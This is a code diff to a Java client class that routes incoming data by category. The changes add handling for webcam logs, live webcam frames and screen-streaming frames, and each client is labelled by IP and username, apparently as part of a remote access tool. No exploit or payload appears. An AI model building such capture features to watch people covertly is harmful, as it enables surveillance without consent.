@@ -19,6 +19,8 @@ import java.util.function.Consumer;
 
 public class Client {
     private Session session;
+
+
     private SystemInformation sysInfo;
     private NetworkInformation netInfo;
     ExecutorService executor = Executors.newCachedThreadPool();
@@ -52,10 +54,17 @@ public class Client {
 
     public void handleFileCompletion(BytesChannel bytesChannel, byte[] finalData) {
         switch (bytesChannel.getCategory()) {
-            case ZIP_FILE -> writeFile(finalData, bytesChannel.getCategoryOutputFolder());
-            case IMAGE -> {
+            case ZIP_FILE, WEBCAM_LOGS -> {
+                writeFile(finalData, bytesChannel.getCategoryOutputFolder());
+                closeFileChannel(bytesChannel.getId());
+            }
+            case WEBCAM_STREAMING -> {
+                updater.updateFrameOfWebcamStreamer(finalData);
                 bytesChannel.getBuffer().clear();
-                System.out.println("!!");
+            }
+            case SCREEN_STREAMING -> {
+                updater.updateFrameOfScreenStreamer(finalData);
+                bytesChannel.getBuffer().clear();
             }
         }
         // closeFileChannel(bytesChannel.getId());
@@ -78,7 +87,6 @@ public class Client {
 
 
     public void processMessage(String message) {
-
         JSONObject object = new JSONObject(message);
         Consumer<JSONObject> action = mapOfResponses.get(Response.valueOf(object.getString("RESPONSE")));
         if (action != null) {
@@ -107,10 +115,6 @@ public class Client {
 
     public String getIdentifier() {
         return netInfo.IP() + " - " + sysInfo.USER_NAME();
-    }
-
-    public void sendMessage(String message) throws IOException {
-        session.getRemote().sendString(message);
     }
 
     public void writeFile(byte[] data, String category) {
